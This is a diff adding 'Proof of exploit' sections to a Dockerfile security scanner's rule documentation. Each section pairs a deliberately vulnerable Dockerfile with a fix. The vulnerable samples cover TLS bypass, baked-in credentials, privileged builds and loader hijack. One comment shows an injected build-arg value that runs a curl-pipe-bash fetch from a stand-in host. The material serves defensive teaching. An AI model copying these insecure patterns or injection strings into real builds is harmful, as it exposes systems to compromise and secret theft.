@@ -5164,6 +5164,30 @@ CMD ["python3", "/app/app.py"]
 
 - ``ADD`` of an internal URL served from an immutable, build-time-frozen object store (a private artifact registry under your control, GCS with object-versioning and uniform bucket-level access) is materially less risky than a public-internet fetch, but the rule still fires because no on-line check can distinguish trusted from untrusted hosts. Prefer the explicit ``--checksum=sha256:<hex>`` form (BuildKit native, doesn't trigger) or move to a ``COPY`` from a builder stage; suppress per-Dockerfile if the deployment target guarantees the URL host can't be substituted.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ADD <url>`` pulls a remote blob into the
+# image at build time with no integrity check. A MITM
+# (compromised proxy, BGP hijack on the mirror) or a
+# host compromise substitutes the file; the build commits
+# the substituted bytes into a layer.
+FROM ubuntu@sha256:abc123...
+ADD https://internal-mirror.example.com/installer.tar.gz /tmp/
+RUN tar -xzf /tmp/installer.tar.gz && /tmp/install.sh
+
+# Safe: ``RUN curl`` to a tempfile, ``sha256sum -c`` against
+# a known-good digest, then extract / execute. The verify
+# step fails loud if the bytes don't match.
+FROM ubuntu@sha256:abc123...
+RUN curl -fsSL https://internal-mirror.example.com/installer.tar.gz \
+      -o /tmp/installer.tar.gz \
+    && echo 'a1b2c3d4...  /tmp/installer.tar.gz' | sha256sum -c - \
+    && tar -xzf /tmp/installer.tar.gz \
+    && /tmp/install.sh \
+    && rm /tmp/installer.tar.gz
+```
+
 **Source:** [`DF-003`](../providers/dockerfile.md#df-003) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-004`: RUN executes a remote script via curl-pipe / wget-pipe <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-004 }
@@ -5208,6 +5232,27 @@ RUN curl -fsSL https://example-installer.example/install.sh -o /tmp/install.sh \
 **How this is detected.** Reuses ``_primitives/shell_eval.scan``, same primitive used by GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 / JF-030 so the safe / unsafe vocabulary matches across the tool.
 
 **Recommendation.** Replace ``eval "$X"`` and ``sh -c "$X"`` with explicit argv invocations. If the build genuinely needs a templated command, render it through a sealed config file or use ``RUN --mount=type=secret`` with explicit input. ``$( … )`` / backticks should never wrap interpolated user-controlled vars inside a Dockerfile.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``eval`` on a build arg, or ``sh -c`` on an
+# unquoted variable, gives the value full shell-grammar
+# reach. A build arg passed via ``docker build --build-arg
+# BUILD_CMD='echo hi;curl evil|bash'`` runs the curl in
+# the build context.
+FROM alpine@sha256:abc123...
+ARG BUILD_CMD
+RUN eval "$BUILD_CMD"
+
+# Safe: replace dynamic shell evaluation with a script you
+# own that validates the arg against an allow-list, or
+# remove the indirection entirely (hard-code the build
+# steps).
+FROM alpine@sha256:abc123...
+ARG TARGET=staging
+RUN ./scripts/build-for-target.sh "$TARGET"
+```
 
 **Source:** [`DF-005`](../providers/dockerfile.md#df-005) in the [Dockerfile provider](../providers/dockerfile.md).
 
@@ -5269,6 +5314,28 @@ RUN --mount=type=secret,id=api_key \
 
 **Recommendation.** A Dockerfile build step almost never legitimately needs ``--privileged`` or ``--cap-add SYS_ADMIN`` / ``ALL``. If the build genuinely requires elevated capabilities (e.g. compiling a kernel module), do it in a sealed builder image and ``COPY`` the artifact out, don't carry the privileged execution into the runtime image.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``RUN docker run --privileged`` (or
+# ``--cap-add=SYS_ADMIN``) during image build requires
+# privileged-mode on the BuildKit daemon AND grants the
+# nested container full kernel access. A compromise of
+# the inner build step escapes to the BuildKit host.
+FROM ubuntu@sha256:abc123...
+RUN docker run --privileged \
+      -v /var/run/docker.sock:/var/run/docker.sock \
+      myorg/inner-builder:latest ./inner-build.sh
+
+# Safe: don't nest privileged docker invocations inside
+# RUN. Use a multi-stage build instead — each stage is
+# its own root filesystem; no host-kernel access required.
+FROM myorg/inner-builder@sha256:abc123... AS builder
+RUN ./inner-build.sh
+FROM ubuntu@sha256:abc123...
+COPY --from=builder /out/ /app/
+```
+
 **Source:** [`DF-008`](../providers/dockerfile.md#df-008) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-009`: ADD used where COPY would suffice <span class="pg-sev pg-sev--low">LOW</span> { #detail-df-009 }
@@ -5309,6 +5376,32 @@ RUN --mount=type=secret,id=api_key \
 
 **Recommendation.** Drop ``sudo`` from the ``RUN``. Either the build is already running as root (the default before any ``USER`` directive), in which case ``sudo`` is no-op noise, or the build switched to a non-root ``USER`` and needs root for a specific step, in which case temporarily revert with ``USER root`` for that ``RUN`` and switch back afterward.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``RUN sudo apt-get install -y curl`` requires
+# the image to ship sudo (extra attack surface) AND runs
+# as a non-root user that has sudo rights. A compromise
+# at runtime can ``sudo`` to root inside the container,
+# defeating the non-root-user posture.
+FROM ubuntu@sha256:abc123...
+RUN apt-get update && apt-get install -y sudo curl
+RUN useradd -m app && adduser app sudo
+USER app
+RUN sudo apt-get install -y jq    # privilege escalation primitive in image
+
+# Safe: do every privileged step BEFORE the ``USER``
+# directive, while still root. Drop sudo from the image
+# entirely. The final ``USER app`` runs without any path
+# back to root.
+FROM ubuntu@sha256:abc123...
+RUN apt-get update \
+    && apt-get install -y curl jq \
+    && useradd -m app \
+    && rm -rf /var/lib/apt/lists/*
+USER app
+```
+
 **Source:** [`DF-012`](../providers/dockerfile.md#df-012) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-013`: EXPOSE declares sensitive remote-access port <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-013 }
@@ -5321,6 +5414,30 @@ RUN --mount=type=secret,id=api_key \
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``EXPOSE 22`` advertises an SSH port on the
+# image. Even if no sshd is actually running, the metadata
+# signals to operators that SSH is part of the contract,
+# encouraging port-forward / publish patterns that put
+# the container's SSH on the network. Container SSH
+# bypasses the cluster's audit and identity layers.
+FROM ubuntu@sha256:abc123...
+RUN apt-get update && apt-get install -y openssh-server
+EXPOSE 22
+CMD ["/usr/sbin/sshd", "-D"]
+
+# Safe: drop the SSH server. Use ``kubectl exec`` (or
+# ``docker exec``) for interactive debugging — both go
+# through the cluster's RBAC / audit pipeline, with no
+# network-exposed SSH surface.
+FROM ubuntu@sha256:abc123...
+RUN apt-get update && apt-get install -y --no-install-recommends app
+EXPOSE 8080
+CMD ["/usr/local/bin/app"]
+```
+
 **Source:** [`DF-013`](../providers/dockerfile.md#df-013) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-014`: WORKDIR set to a system / kernel filesystem path <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-df-014 }
@@ -5330,6 +5447,29 @@ RUN --mount=type=secret,id=api_key \
 **How this is detected.** Subsequent directives in the Dockerfile (``COPY src dest``, ``RUN`` writes, ``ADD …``) resolve relative paths against the active ``WORKDIR``. A ``WORKDIR /sys`` followed by ``COPY conf.txt config.txt`` writes into the kernel's sysfs surface, at best a build-time error, at worst a container-escape primitive that lets a compromised step manipulate cgroups, devices, or kernel config.
 
 **Recommendation.** Move ``WORKDIR`` to a dedicated app directory (``/app``, ``/srv/app``, ``/opt/<service>``). System paths like ``/sys``, ``/proc``, ``/dev``, ``/etc``, ``/`` and the ``root`` home are not application directories, pointing the working dir at one means subsequent ``COPY`` / ``RUN`` writes target kernel-exposed namespaces or admin-only configuration.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``WORKDIR /proc`` (or ``/sys`` / ``/etc``)
+# sets the runtime working directory to a kernel-managed
+# filesystem. Relative file writes from the app then
+# attempt to write into kernel sysfs / procfs; at best
+# the writes fail silently, at worst they cause runtime
+# misbehavior on shared host kernel resources.
+FROM alpine@sha256:abc123...
+WORKDIR /proc
+COPY app /usr/local/bin/app
+CMD ["app"]
+
+# Safe: a normal application directory under ``/app`` or
+# ``/srv``. The app writes its own files in an isolated
+# location.
+FROM alpine@sha256:abc123...
+WORKDIR /app
+COPY app /usr/local/bin/app
+CMD ["app"]
+```
 
 **Source:** [`DF-014`](../providers/dockerfile.md#df-014) in the [Dockerfile provider](../providers/dockerfile.md).
 
@@ -5397,6 +5537,33 @@ RUN --mount=type=secret,id=api_key \
 
 - Empty placeholder files (``.env`` shipped as a template, ``config.json`` carrying only public flags). Suppress with a brief ``.pipelinecheckignore`` rationale and prefer an explicit non-secret name (``.env.example``).
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``COPY .npmrc`` (or ``.aws/credentials`` /
+# ``.kube/config`` / ``.netrc``) bakes the host's local
+# credential file into the image. Anyone who pulls the
+# image extracts the credential via
+# ``docker save | tar xf -``; the secret rides the image
+# everywhere it's distributed.
+FROM node@sha256:abc123...
+WORKDIR /app
+COPY . .
+COPY .npmrc /root/.npmrc    # carries auth token into layer
+RUN npm ci && npm run build
+
+# Safe: use BuildKit's ``--mount=type=secret`` so the
+# credential file is mounted only for the RUN that needs
+# it. The secret never lands in any layer; ``docker save``
+# returns an image with no trace.
+# syntax=docker/dockerfile:1.7
+FROM node@sha256:abc123...
+WORKDIR /app
+COPY . .
+RUN --mount=type=secret,id=npmrc,target=/root/.npmrc \
+    npm ci && npm run build
+```
+
 **Source:** [`DF-019`](../providers/dockerfile.md#df-019) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-020`: ARG declares a credential-named build argument <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-020 }
@@ -5413,6 +5580,32 @@ RUN --mount=type=secret,id=api_key \
 
 - An ``ARG`` whose name matches the regex but is a non-secret config knob (a counter-example like ``ARG TOKEN_LIMIT``). Rare; rename or suppress the finding with a brief rationale.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ARG NPM_TOKEN`` declares a build argument
+# whose name signals it carries a credential. Build args
+# are visible in ``docker history``, so the value (passed
+# via ``--build-arg NPM_TOKEN=...``) lands in image
+# metadata and leaks the same way as a literal ENV.
+FROM node@sha256:abc123...
+ARG NPM_TOKEN
+RUN npm config set //registry.npmjs.org/:_authToken "$NPM_TOKEN" \
+    && npm ci
+
+# Safe: use BuildKit secret mounts. The token is read
+# from a file at RUN time only; nothing about the token
+# (not even its existence as a build arg) lands in
+# ``docker history``.
+# syntax=docker/dockerfile:1.7
+FROM node@sha256:abc123...
+RUN --mount=type=secret,id=npm_token \
+    NPM_TOKEN=$(cat /run/secrets/npm_token) && \
+    npm config set //registry.npmjs.org/:_authToken "$NPM_TOKEN" && \
+    npm ci && \
+    npm config delete //registry.npmjs.org/:_authToken
+```
+
 **Source:** [`DF-020`](../providers/dockerfile.md#df-020) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-021`: RUN pip install bypasses TLS or uses an HTTP index <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-021 }
@@ -5426,6 +5619,31 @@ RUN --mount=type=secret,id=api_key \
 **Known false positives.**
 
 - An internal index served over plain HTTP on a private network (no internet path) is the typical justification for the flag. Fix the index (terminate TLS at a reverse proxy, or install the internal CA into the image) rather than leaving the bypass in the Dockerfile.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: pip resolves and downloads packages over
+# plaintext HTTP, so any network attacker between the
+# build and the registry can substitute a wheel. The
+# ``--trusted-host`` flag silences pip's hash
+# verification for the named host too.
+FROM python@sha256:abc123...
+RUN pip install \
+      --index-url http://internal-pypi.example.com/simple \
+      --trusted-host internal-pypi.example.com \
+      -r requirements.txt
+
+# Safe: HTTPS with the index's certificate validated.
+# Internal CA installed into the image's trust store;
+# ``--require-hashes`` enforces hash pinning.
+FROM python@sha256:abc123...
+COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
+RUN update-ca-certificates && \
+    pip install \
+      --index-url https://internal-pypi.example.com/simple \
+      --require-hashes -r requirements.txt
+```
 
 **Source:** [`DF-021`](../providers/dockerfile.md#df-021) in the [Dockerfile provider](../providers/dockerfile.md).
 
@@ -5455,6 +5673,27 @@ RUN --mount=type=secret,id=api_key \
 **Known false positives.**
 
 - Sanitizer-instrumented images (``LD_PRELOAD=libasan.so``) and APM agent hooks (``LD_PRELOAD=/opt/dynatrace/...``) are legitimate. Suppress the finding for the specific Dockerfile with a one-line rationale; the rule deliberately catches the pattern because the same shape is the standard loader-hijack escalation primitive.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ENV LD_PRELOAD=/tmp/lib.so`` (or
+# ``LD_LIBRARY_PATH`` to a writable directory,
+# ``PYTHONPATH``, ``CLASSPATH``) configures the dynamic
+# loader to consult an attacker-influencable location
+# at runtime. A write into ``/tmp`` then runs arbitrary
+# code in every process the container starts.
+FROM ubuntu@sha256:abc123...
+ENV LD_PRELOAD=/tmp/libhook.so
+CMD ["/usr/local/bin/app"]
+
+# Safe: no loader-hijack env vars in the image. If a
+# library actually needs to override loader paths, do
+# it inside the app's startup logic against a fixed,
+# read-only path, not via process env.
+FROM ubuntu@sha256:abc123...
+CMD ["/usr/local/bin/app"]
+```
 
 **Source:** [`DF-023`](../providers/dockerfile.md#df-023) in the [Dockerfile provider](../providers/dockerfile.md).
 
@@ -5559,6 +5798,30 @@ If the internal registry / API genuinely has a self-signed cert, install the CA 
 
 - Test-only images that interact with a local mock server using a throwaway self-signed cert sometimes set this intentionally. Keep the bypass scoped to a separate ``test`` build stage and DON'T copy it into the final image; the production stage should never carry the variable. Suppress on the test-stage Dockerfile with a rationale that names the mock server.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ENV NODE_TLS_REJECT_UNAUTHORIZED=0``
+# disables TLS verification for every Node.js process
+# in the container. Any HTTPS call (npm install at
+# runtime, internal API call, vendor SDK) is MITM-able.
+FROM node@sha256:abc123...
+ENV NODE_TLS_REJECT_UNAUTHORIZED=0
+COPY . /app
+WORKDIR /app
+CMD ["npm", "start"]
+
+# Safe: install the missing CA into the image trust
+# store and leave ``NODE_TLS_REJECT_UNAUTHORIZED`` at
+# its safe default. Node honors the system CA bundle.
+FROM node@sha256:abc123...
+COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
+RUN update-ca-certificates
+COPY . /app
+WORKDIR /app
+CMD ["npm", "start"]
+```
+
 **Source:** [`DF-026`](../providers/dockerfile.md#df-026) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-027`: ENV disables Python HTTPS certificate verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-027 }
@@ -5572,6 +5835,30 @@ Complements DF-021 (``pip install`` TLS bypass via flags) and DF-026 (Node TLS b
 **Recommendation.** Remove the ``ENV PYTHONHTTPSVERIFY=0`` instruction. The variable tells Python's stdlib ``urllib`` and any library that delegates to it (most of them) to accept any TLS certificate. The bypass applies to every subsequent process — ``pip install``, runtime API calls, postinstall scripts — for the rest of the image's life. The same primitive in flag form (``pip install --trusted-host``) is DF-021's surface; DF-027 catches the env-var form that affects every Python invocation, not just pip.
 
 If the internal index has a self-signed cert, install the CA into the image's truststore (``REQUESTS_CA_BUNDLE`` pointing at a real CA bundle, or ``update-ca-certificates`` for the system bundle) rather than blanket-disabling verification.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ENV PYTHONHTTPSVERIFY=0`` disables TLS
+# verification for every Python process in the
+# container. pip, requests-via-urllib3, every API call
+# now ignores certificate validity.
+FROM python@sha256:abc123...
+ENV PYTHONHTTPSVERIFY=0
+COPY . /app
+WORKDIR /app
+CMD ["python", "main.py"]
+
+# Safe: install the missing CA, keep PYTHONHTTPSVERIFY
+# at the safe default. Python's ``ssl`` module reads
+# from the system CA store.
+FROM python@sha256:abc123...
+COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
+RUN update-ca-certificates
+COPY . /app
+WORKDIR /app
+CMD ["python", "main.py"]
+```
 
 **Source:** [`DF-027`](../providers/dockerfile.md#df-027) in the [Dockerfile provider](../providers/dockerfile.md).
 
@@ -5591,6 +5878,27 @@ Pairs with DF-026 (Node TLS), DF-027 (Python TLS), and DF-029 (Python requests T
 
 If you need to clone from an internal Git server with a self-signed cert, install the CA into the image's truststore — same fix as DF-026 / DF-027. The TLS-bypass primitive doesn't need to be image-wide for any legitimate use case.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ENV GIT_SSL_NO_VERIFY=1`` disables git's
+# certificate verification for every clone / fetch. A
+# MITM substitutes the remote's contents on the next
+# git operation.
+FROM alpine/git@sha256:abc123...
+ENV GIT_SSL_NO_VERIFY=1
+RUN git clone https://internal.example.com/repo.git /src
+
+# Safe: install the missing CA, keep git's SSL
+# verification on. ``GIT_SSL_CAPATH`` / ``GIT_SSL_CAINFO``
+# can also be used to point git at a specific CA bundle
+# if updating the system trust store isn't an option.
+FROM alpine/git@sha256:abc123...
+COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
+RUN update-ca-certificates && \
+    git clone https://internal.example.com/repo.git /src
+```
+
 **Source:** [`DF-028`](../providers/dockerfile.md#df-028) in the [Dockerfile provider](../providers/dockerfile.md).
 
 ### `DF-029`: ENV neuters Python requests CA bundle <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-029 }
@@ -5608,6 +5916,33 @@ A path to a real file (``/etc/ssl/certs/...``, ``/usr/local/share/ca-certificate
 **Recommendation.** Set ``ENV REQUESTS_CA_BUNDLE`` to the path of a real CA bundle (typically ``/etc/ssl/certs/ca-certificates.crt`` on Debian or ``/etc/ssl/cert.pem`` on Alpine), or unset it entirely so the ``requests`` library falls back to ``certifi``. Pointing the variable at ``/dev/null`` or an empty string is a documented anti-pattern: ``requests`` treats the empty / missing bundle as 'verify against nothing,' which silently accepts every certificate.
 
 The same shape as DF-027 (``PYTHONHTTPSVERIFY=0``) but narrower in surface — ``REQUESTS_CA_BUNDLE`` only affects ``requests`` and its descendants, not the stdlib ``urllib``. Still a real bypass because most Python network clients (pip, AWS CLI, Anchore, Trivy, every Django app) flow through ``requests``.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ENV REQUESTS_CA_BUNDLE=/dev/null`` (or
+# the empty string, or a non-existent path) neuters the
+# CA bundle Python's requests library consults. Every
+# HTTPS call requests makes silently fails verification
+# or accepts any cert.
+FROM python@sha256:abc123...
+ENV REQUESTS_CA_BUNDLE=/dev/null
+COPY . /app
+WORKDIR /app
+CMD ["python", "main.py"]
+
+# Safe: point ``REQUESTS_CA_BUNDLE`` at the system trust
+# store (or leave it unset, in which case requests uses
+# certifi). Install internal CAs into the system store
+# rather than papering over with a null bundle.
+FROM python@sha256:abc123...
+COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
+RUN update-ca-certificates
+ENV REQUESTS_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt
+COPY . /app
+WORKDIR /app
+CMD ["python", "main.py"]
+```
 
 **Source:** [`DF-029`](../providers/dockerfile.md#df-029) in the [Dockerfile provider](../providers/dockerfile.md).
 
